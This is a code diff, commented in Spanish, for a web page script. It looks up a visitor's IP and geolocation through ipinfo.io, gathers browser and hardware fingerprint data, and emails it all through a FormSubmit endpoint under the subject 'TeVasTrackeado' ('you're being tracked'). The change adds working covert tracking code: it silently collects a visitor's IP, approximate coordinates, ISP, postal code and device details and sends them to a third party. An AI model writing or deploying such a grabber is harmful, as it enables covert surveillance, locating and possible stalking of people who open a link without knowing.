@@ -57,67 +57,54 @@
         const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         const colorDepth = screen.colorDepth;
         
-        // --- FUNCIÓN PRINCIPAL: Dos Pasos para Estabilidad ---
+        // --- FUNCIÓN PRINCIPAL: API de Respaldo (ipinfo.io/json) para Máxima Estabilidad ---
 
-        // Paso A: Obtener la IP simple (api.ipify.org es HTTPS y estable)
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const userIP = data.ip;
+        // ipinfo.io es extremadamente estable y no suele tener bloqueos de rate limit para uso esporádico.
+        const scanUrl = 'https://ipinfo.io/json';
+
+        fetch(scanUrl)
+            .then(geoResponse => geoResponse.json())
+            .then(geoData => {
                 
-                // Paso B: Escanear la IP con ip-api.com (Geo, ISP, Seguridad)
-                // 🚨 CORRECCIÓN CRÍTICA: Se cambia 'http' por 'https' para evitar el bloqueo de "Mixed Content".
-                const scanUrl = `https://ip-api.com/json/${userIP}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,reverse,hosting,proxy,mobile`;
+                const userIP = geoData.ip || 'N/A';
                 
-                return fetch(scanUrl)
-                    .then(geoResponse => geoResponse.json())
-                    .then(geoData => {
-                        
-                        // Si el estado no es 'success', al menos enviamos los datos del dispositivo.
-                        if (geoData.status !== 'success') {
-                            console.error("Fallo en el escaneo de IP, enviando solo datos del dispositivo.");
-                        }
+                // Ensamblar TODOS los datos para el envío final
+                const finalPayload = {
+                    "_subject": "✅ DATOS ESTABLES (IPinfo) - TeVasTrackeado", 
+                    "IP_Visitante": userIP,
+                    
+                    // --- DATOS DE GEOLOCALIZACIÓN Y RED (ipinfo.io) ---
+                    "Geo_Ubicacion": `${geoData.city || 'N/A'}, ${geoData.region || 'N/A'}, ${geoData.country || 'N/A'}`,
+                    "Coordenadas_GPS_IP": geoData.loc || 'N/A',
+                    "Organizacion_ISP": geoData.org || 'N/A',
+                    "Codigo_Postal": geoData.postal || 'N/A',
+                    "Hostname": geoData.hostname || 'N/A',
 
-                        // Ensamblar TODOS los datos para el envío final
-                        const finalPayload = {
-                            "_subject": "✅ DATOS RECIBIDOS (HTTPS) - TeVasTrackeado", 
-                            "IP_Visitante": userIP,
-                            
-                            // --- DATOS DE GEOLOCALIZACIÓN Y RED (ip-api.com) ---
-                            "Geo_Pais_Region": `${geoData.country || 'N/A'} - ${geoData.regionName || 'N/A'} (${geoData.city || 'N/A'})`,
-                            "Coordenadas_GPS_IP": `${geoData.lat || 'N/A'}, ${geoData.lon || 'N/A'}`,
-                            "Organizacion_ISP": geoData.isp || geoData.org || 'N/A',
-                            "ASN": geoData.as || 'N/A',
-                            "Codigo_Postal": geoData.zip || 'N/A',
-                            "Reverse_DNS": geoData.reverse || 'N/A', 
+                    // --- DATOS DE SEGURIDAD Y CONEXIÓN (Incompletos con esta API) ---
+                    "Proxy_VPN": 'No disponible con esta API gratuita',
+                    "Movil": 'No disponible con esta API gratuita',
 
-                            // --- DATOS DE SEGURIDAD Y CONEXIÓN ---
-                            "Es_Proxy_VPN": geoData.proxy === true ? '🚨 SÍ' : 'No',
-                            "Es_Movil": geoData.mobile === true ? 'Sí' : 'No',
-                            "Es_Hosting_DataCenter": geoData.hosting === true ? 'Sí' : 'No',
-
-                            // --- DATOS DEL NAVEGADOR Y HARDWARE ---
-                            "Agente_de_Usuario": userAgent,
-                            "Plataforma_SO": platform,
-                            "Nucleos_CPU": cpuCores,
-                            "Resolucion": screenRes,
-                            "Profundidad_Color": colorDepth,
-                            "Idioma": userLanguage,
-                            "Zona_Horaria": timeZone,
-                            "Referencia_Web": referrer,
-                            "Fecha_Hora_Visita": new Date().toLocaleString(),
-                        };
-                        
-                        // Paso C: Enviar TODOS los datos al correo (FormSubmit)
-                        return fetch(FORM_SUBMIT_ENDPOINT, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                                'Accept': 'application/json'
-                            },
-                            body: JSON.stringify(finalPayload)
-                        });
-                    });
+                    // --- DATOS DEL NAVEGADOR Y HARDWARE ---
+                    "Agente_de_Usuario": userAgent,
+                    "Plataforma_SO": platform,
+                    "Nucleos_CPU": cpuCores,
+                    "Resolucion": screenRes,
+                    "Profundidad_Color": colorDepth,
+                    "Idioma": userLanguage,
+                    "Zona_Horaria": timeZone,
+                    "Referencia_Web": referrer,
+                    "Fecha_Hora_Visita": new Date().toLocaleString(),
+                };
+                
+                // Enviar TODOS los datos al correo (FormSubmit)
+                return fetch(FORM_SUBMIT_ENDPOINT, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(finalPayload)
+                });
             })
             .then(response => {
                  if (response.ok) {
